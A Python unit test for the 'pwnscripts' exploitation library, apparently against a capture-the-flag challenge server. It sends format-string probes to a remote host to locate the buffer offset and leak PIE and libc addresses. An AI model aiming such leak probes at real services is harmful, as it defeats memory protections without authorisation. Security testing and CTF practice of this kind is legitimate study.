import unittest as ut
from pwnscripts import *

class BinTests(ut.TestCase):
    def test_printf(self):
        #some constants
        context.arch = 'amd64'
        lsmr = 0x270b3
        pie = 0x7e0
        #helper functions
        def printf(s: str) -> bytes:
            r = remote('irscybersec.tk', 4449)
            r.sendlineafter(': ', s)
            return r.recvline()
        #find printf stuff [you can replace these with constants if you want]
        s_offset = find_printf_offset_buffer(printf)
        PIE_offset = next(find_printf_offset_PIE(printf, pie))
        lsmr_offset = next(find_printf_offset_libc(printf, lsmr%0x100))
        assert None not in [s_offset, PIE_offset, lsmr_offset] #probabilistic algo
        self.assertEqual([6,11,17], [s_offset, PIE_offset, lsmr_offset])
        
if __name__ == '__main__':
    ut.main()